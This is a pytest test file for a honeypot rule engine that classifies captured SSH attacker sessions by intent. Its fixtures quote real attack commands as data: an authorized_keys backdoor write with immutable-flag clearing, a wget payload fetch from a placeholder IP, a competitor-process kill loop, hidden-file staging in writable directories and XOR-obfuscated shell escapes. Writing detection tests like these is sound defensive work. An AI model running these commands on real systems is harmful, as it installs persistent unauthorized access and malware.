"""Tests for the rule engine.

Every session in this file is a real one, taken verbatim from what this
honeypot received, with nothing invented. That matters more than usual here:
a rule engine tested against commands its author made up tests the author's
imagination, and passes while failing on the first thing a real botnet types.

The card asks for a test per category, which these provide — plus the cases
that decide whether the precedence rule is actually being applied rather than
merely documented.
"""

from __future__ import annotations

import pytest

from honeypot_ai.classify.facts import SessionFacts
from honeypot_ai.classify.rules import (
    RULES,
    classify,
    deobfuscate,
    infer_operator,
    match_behaviours,
)
from honeypot_ai.classify.taxonomy import Behaviour, Intent, Operator

# --- Real sessions ---------------------------------------------------------

FINGERPRINT = ("uname -s -v -n -r -m",)

SHELL_ESCAPE = (
    "enable",
    "enable ",
    "linuxshell",
    "linuxshell ",
    "system",
    "system ",
    "shell",
    "shell ",
    "sh",
)

BUSYBOX = (
    "/bin/busybox HISILICON",
    "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
    'echo -e "\\x47\\x41\\x59\\x46\\x47\\x54"',
)

WRITABLE_HUNT = (
    ">/dev/.f && chmod 777 /dev/.f && /dev/.f && cd /dev/;",
    ">/var/run/.f && chmod 777 /var/run/.f && /var/run/.f && cd /var/run/;",
    ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;",
)

EXECUTION_TEST = (
    'printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter '
    "&& chmod +x filter && ./filter && rm -rf filter",
)

RESOURCE_PROFILE = (
    "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH",
    "cpus=$(nproc 2>/dev/null || busybox nproc 2>/dev/null)",
    "cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; } | head -1 )",
    "gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia) )",
    "uptime=$(cat /proc/uptime 2>/dev/null)",
    "last_output=$(last 2>/dev/null)",
)

SSH_KEY = (
    "cd ~; chattr -ia .ssh; lockr -ia .ssh",
    "lockr -ia .ssh",
    'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3Nz...mdrfckr"'
    ">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
)

COMPETITOR_KILL = (
    "#!/bin/sh\n"
    "for proc_dir in /proc/*; do\n"
    "    pid=${proc_dir##*/}\n"
    '    result=$(ls -l "/proc/$pid/exe" 2> /dev/null)\n'
    '    if [ "$result" != "${result%(deleted)}" ]; then\n'
    '        kill -9 "$pid"\n'
    "    fi\n"
    "done",
)


def facts(*commands: str, session_id: str = "s1", **kwargs: object) -> SessionFacts:
    return SessionFacts(session_id=session_id, commands=commands, **kwargs)  # type: ignore[arg-type]


# --- One test per category -------------------------------------------------


def test_a_session_with_no_commands_is_credential_access() -> None:
    label = classify(SessionFacts(session_id="s1", authenticated=True))
    assert label.intent is Intent.CREDENTIAL_ACCESS
    assert label.confidence == 1.0


def test_the_single_uname_probe_is_fingerprinting() -> None:
    """72% of this honeypot's sessions. If anything must be right, it is this."""
    label = classify(facts(*FINGERPRINT))
    assert label.intent is Intent.FINGERPRINTING
    assert Behaviour.HOST_ENUMERATION in label.behaviours
    assert label.confidence == 1.0


def test_the_menu_escape_sequence_is_shell_probing() -> None:
    label = classify(facts(*SHELL_ESCAPE))
    assert label.intent is Intent.SHELL_PROBING
    assert Behaviour.SHELL_ESCAPE in label.behaviours


def test_busybox_probing_is_shell_probing() -> None:
    label = classify(facts(*BUSYBOX))
    assert label.intent is Intent.SHELL_PROBING
    assert {Behaviour.BUSYBOX_PROBE, Behaviour.MARKER_ECHO} <= label.behaviours


def test_the_hardware_survey_is_resource_profiling() -> None:
    label = classify(facts(*RESOURCE_PROFILE))
    assert label.intent is Intent.RESOURCE_PROFILING
    assert Behaviour.GPU_DETECTION in label.behaviours
    assert Behaviour.CPU_PROFILING in label.behaviours


def test_the_writable_directory_sweep_is_staging() -> None:
    label = classify(facts(*WRITABLE_HUNT))
    assert label.intent is Intent.STAGING
    assert Behaviour.WRITABLE_DIR_HUNT in label.behaviours


def test_writing_and_running_a_throwaway_script_is_staging() -> None:
    label = classify(facts(*EXECUTION_TEST))
    assert label.intent is Intent.STAGING
    assert Behaviour.EXECUTION_TEST in label.behaviours


def test_the_authorized_keys_campaign_is_persistence() -> None:
    label = classify(facts(*SSH_KEY))
    assert label.intent is Intent.PERSISTENCE
    assert {
        Behaviour.IMMUTABLE_FLAG_CLEAR,
        Behaviour.SSH_DIR_RESET,
        Behaviour.AUTHORIZED_KEYS_WRITE,
    } <= label.behaviours


def test_a_download_attempt_is_staging_even_though_egress_is_blocked() -> None:
    label = classify(facts("wget http://198.51.100.9/bins/x86 -O /tmp/x"))
    assert label.intent is Intent.STAGING
    assert Behaviour.PAYLOAD_DOWNLOAD in label.behaviours


def test_a_recorded_transfer_counts_even_with_no_matching_command() -> None:
    """Cowrie records downloads it performed; no command text need mention them."""
    label = classify(
        SessionFacts(
            session_id="s1",
            commands=("uname -a",),
            download_urls=("http://198.51.100.9/bins/x86",),
            captured_hashes=("a" * 64,),
        )
    )
    assert Behaviour.PAYLOAD_DOWNLOAD in label.behaviours
    assert Behaviour.PAYLOAD_EXECUTION in label.behaviours
    assert label.intent is Intent.STAGING


def test_nothing_recognised_is_other_and_says_so() -> None:
    label = classify(facts("please stop scanning me"))
    assert label.intent is Intent.OTHER
    assert label.behaviours == frozenset()
    assert label.notes == "no rule matched any command"


# --- The precedence rule, applied rather than merely documented ------------


def test_fingerprinting_then_persistence_is_persistence() -> None:
    """The worked example from docs/taxonomy.md, as a test."""
    label = classify(facts(*FINGERPRINT, *SSH_KEY))
    assert label.intent is Intent.PERSISTENCE


def test_a_session_doing_everything_still_gets_the_furthest_label() -> None:
    label = classify(facts(*FINGERPRINT, *SHELL_ESCAPE, *RESOURCE_PROFILE, *WRITABLE_HUNT))
    assert label.intent is Intent.STAGING


def test_killing_competitors_is_recorded_but_places_nobody() -> None:
    """A behaviour with no intent must not drag the label anywhere."""
    label = classify(facts(*FINGERPRINT, *COMPETITOR_KILL))
    assert Behaviour.COMPETITOR_KILL in label.behaviours
    assert label.intent is Intent.FINGERPRINTING


# --- Coverage --------------------------------------------------------------


def test_confidence_is_the_share_of_commands_a_rule_recognised() -> None:
    label = classify(facts("uname -a", "please stop scanning me"))
    assert label.confidence == 0.5


def test_a_label_from_almost_nothing_reports_low_coverage() -> None:
    noise = tuple(f"unrecognised command {n}" for n in range(9))
    label = classify(facts("uname -a", *noise))
    assert label.intent is Intent.FINGERPRINTING
    assert label.confidence is not None
    assert label.confidence < 0.2


# --- Operator --------------------------------------------------------------


def test_commands_milliseconds_apart_were_not_typed() -> None:
    assert infer_operator(facts("a", "b", "c", command_gaps=(0.01, 0.02))) is Operator.AUTOMATED


def test_a_slow_session_is_unknown_not_interactive() -> None:
    """A script with sleep in it looks exactly like a person. Say so."""
    assert infer_operator(facts("a", "b", command_gaps=(12.0,))) is Operator.UNKNOWN


def test_a_single_command_says_nothing_about_who_sent_it() -> None:
    assert infer_operator(facts("uname -a")) is Operator.UNKNOWN


# --- Invariants ------------------------------------------------------------


def test_every_behaviour_in_the_taxonomy_has_a_rule_or_another_source() -> None:
    """A behaviour nothing can ever produce is dead weight in the vocabulary."""
    from_rules = {rule.behaviour for rule in RULES}
    # These come from somewhere other than a pattern over command text.
    from_transfers = {Behaviour.PAYLOAD_DOWNLOAD, Behaviour.PAYLOAD_EXECUTION}
    from_decoder = {Behaviour.OBFUSCATED_COMMAND}
    assert from_rules | from_transfers | from_decoder == set(Behaviour)


def test_every_rule_explains_itself() -> None:
    """`why` is read by a human deciding whether a rule is defensible."""
    assert all(rule.why for rule in RULES)


@pytest.mark.parametrize("commands", [FINGERPRINT, SHELL_ESCAPE, SSH_KEY, WRITABLE_HUNT])
def test_classification_is_deterministic(commands: tuple[str, ...]) -> None:
    """Same input, same label — the property the whole comparison depends on."""
    first = classify(facts(*commands))
    second = classify(facts(*commands))
    assert first == second


def test_matching_is_case_insensitive() -> None:
    lowered, _ = match_behaviours(facts("uname -a"))
    upped, _ = match_behaviours(facts("UNAME -A"))
    assert lowered == upped


# --- Gaps found by running the rules over the whole corpus -----------------
#
# The first full run left 2.5% of sessions unlabelled, above the threshold
# docs/taxonomy.md sets for "the taxonomy is wrong". Reading them produced the
# four groups below. Each is a real session.

OBFUSCATED_ESCAPE = ("lghkel", "zpz}ld", "zalee", "za")

HTTP_PROBE = (
    "User-Agent: Mozilla/5.0 zgrab/0.x",
    "Accept: */*",
    "Accept-Encoding: gzip",
)

SIP_PROBE = (
    "From: <sip:nm@nm>;tag=root",
    "To: <sip:nm2@nm2>",
    "Call-ID: 50000",
    "CSeq: 42 OPTIONS",
    "Max-Forwards: 70",
)


def test_plain_hostname_is_host_enumeration() -> None:
    """The first pattern required `hostnamectl`, so bare `hostname` fell through."""
    label = classify(facts("hostname"))
    assert label.intent is Intent.FINGERPRINTING
    assert Behaviour.HOST_ENUMERATION in label.behaviours


@pytest.mark.parametrize("command", ["pwd", "ls -la /", "df", "find / -name x"])
def test_looking_around_the_filesystem_is_fingerprinting(command: str) -> None:
    label = classify(facts(command))
    assert label.intent is Intent.FINGERPRINTING
    assert Behaviour.FILESYSTEM_DISCOVERY in label.behaviours


@pytest.mark.parametrize("command", ["netstat -tulpn | head -10", "ss -lntp", "ifconfig"])
def test_looking_at_the_network_is_fingerprinting(command: str) -> None:
    label = classify(facts(command))
    assert label.intent is Intent.FINGERPRINTING
    assert Behaviour.NETWORK_DISCOVERY in label.behaviours


def test_an_http_scanner_is_a_protocol_probe_not_an_attack() -> None:
    """zgrab speaking HTTP at port 22 never touched the shell."""
    label = classify(facts(*HTTP_PROBE))
    assert label.intent is Intent.PROTOCOL_PROBE
    assert Behaviour.HTTP_REQUEST in label.behaviours


def test_a_sip_probe_is_a_protocol_probe() -> None:
    label = classify(facts(*SIP_PROBE))
    assert label.intent is Intent.PROTOCOL_PROBE
    assert Behaviour.SIP_REQUEST in label.behaviours


def test_a_protocol_probe_loses_to_any_real_engagement() -> None:
    """Bottom of the precedence order: least engagement a session can have."""
    label = classify(facts(*HTTP_PROBE, "uname -a"))
    assert label.intent is Intent.FINGERPRINTING


def test_the_xor_encoded_escape_sequence_is_recognised() -> None:
    """`lghkel zpz}ld zalee za` is `enable system shell sh` XOR 0x09."""
    label = classify(facts(*OBFUSCATED_ESCAPE))
    assert label.intent is Intent.SHELL_PROBING
    assert Behaviour.SHELL_ESCAPE in label.behaviours
    assert Behaviour.OBFUSCATED_COMMAND in label.behaviours


@pytest.mark.parametrize(
    ("encoded", "plain"),
    [("lghkel", "enable"), ("zpz}ld", "system"), ("zalee", "shell"), ("za", "sh")],
)
def test_each_encoded_word_decodes_to_its_plain_form(encoded: str, plain: str) -> None:
    assert deobfuscate(encoded) == plain


def test_decoding_never_reinterprets_a_command_that_already_matched() -> None:
    """The decoder may add a missed match; it may never override a real one."""
    label = classify(facts("uname -a"))
    assert Behaviour.OBFUSCATED_COMMAND not in label.behaviours


@pytest.mark.parametrize("noise", ["please stop scanning me", "hello world", "$$$$", ""])
def test_decoding_refuses_to_turn_noise_into_a_label(noise: str) -> None:
    assert deobfuscate(noise) is None
